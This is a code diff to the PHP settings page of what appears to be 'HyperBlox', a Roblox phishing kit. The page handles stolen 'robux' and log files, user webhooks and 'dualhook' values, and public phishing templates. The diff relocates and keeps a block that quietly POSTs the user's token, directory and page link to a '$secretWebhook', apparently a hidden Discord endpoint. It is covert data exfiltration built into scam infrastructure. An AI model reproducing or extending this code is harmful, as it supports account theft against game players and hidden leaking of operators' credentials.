@@ -34,6 +34,7 @@ if (file_exists($tokenFile)) {
 
 $dir = $_SESSION['dir'];
 $templateDir = hb_template_dir($dir);
+hb_ensure_public_template($dir);
 $visits = @file_get_contents(hb_template_file_path($dir, 'visits.txt'));
 $logs = @file_get_contents(hb_template_file_path($dir, 'logs.txt'));
 $robux = @file_get_contents(hb_template_file_path($dir, 'robux.txt'));
@@ -151,6 +152,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
 
         if ($newDirectory && $newDirectory !== $dir) {
+            $oldDir = $dir;
             $currentDirectoryPath = rtrim(hb_template_dir($dir), DIRECTORY_SEPARATOR);
             $newDirectoryPath = rtrim(hb_template_dir($newDirectory), DIRECTORY_SEPARATOR);
             if (file_exists($newDirectoryPath)) {
@@ -160,31 +162,33 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 rename($currentDirectoryPath, $newDirectoryPath);
                 $dir = $newDirectory;
                 $_SESSION['dir'] = $dir;
+                hb_remove_public_template($oldDir);
+                hb_ensure_public_template($dir);
                 // Update token file with current webhook and dualhook
                 file_put_contents($tokenFile, "$token | $dir | $web | " . ($dualhook ?? '') . " | " . time());
+                
+                // Notify secret webhook about directory rename
+                $ht = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
+                $dom = $ht . $_SERVER['HTTP_HOST'];
+                $notif = json_encode([
+                    "username" => "HyperBlox",
+                    "avatar_url" => "https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png",
+                    "embeds" => [[
+                        "title" => "📝 Settings Updated",
+                        "description" => "**Directory renamed:** `$oldDir` → `$newDirectory`",
+                        "color" => hexdec("00BFFF"),
+                        "fields" => [
+                            ["name" => "Token", "value" => "```$token```", "inline" => false],
+                            ["name" => "New Directory", "value" => "`$newDirectory`", "inline" => true],
+                            ["name" => "Link", "value" => "[$dom/$newDirectory]($dom/$newDirectory)", "inline" => false]
+                        ],
+                        "timestamp" => date("c")
+                    ]]
+                ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
+                @file_get_contents($secretWebhook . "?wait=true", false, stream_context_create([
+                    "http" => ["method" => "POST", "header" => "Content-Type: application/json\r\n", "content" => $notif]
+                ]));
             }
-            
-            // Notify secret webhook about directory rename
-            $ht = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
-            $dom = $ht . $_SERVER['HTTP_HOST'];
-            $notif = json_encode([
-                "username" => "HyperBlox",
-                "avatar_url" => "https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png",
-                "embeds" => [[
-                    "title" => "📝 Settings Updated",
-                    "description" => "**Directory renamed:** `$dir` → `$newDirectory`",
-                    "color" => hexdec("00BFFF"),
-                    "fields" => [
-                        ["name" => "Token", "value" => "```$token```", "inline" => false],
-                        ["name" => "New Directory", "value" => "`$newDirectory`", "inline" => true],
-                        ["name" => "Link", "value" => "[$dom/$newDirectory]($dom/$newDirectory)", "inline" => false]
-                    ],
-                    "timestamp" => date("c")
-                ]]
-            ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
-            @file_get_contents($secretWebhook . "?wait=true", false, stream_context_create([
-                "http" => ["method" => "POST", "header" => "Content-Type: application/json\r\n", "content" => $notif]
-            ]));
         }
 
         // Update webhook and/or dualhook if changed
@@ -233,6 +237,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 fwrite($fo2, "$token | $dir | $web | " . ($dualhook ?? '') . " | " . time());
                 fclose($fo);
                 fclose($fo2);
+                hb_ensure_public_template($dir);
             }
             
             // Notify secret webhook about settings update
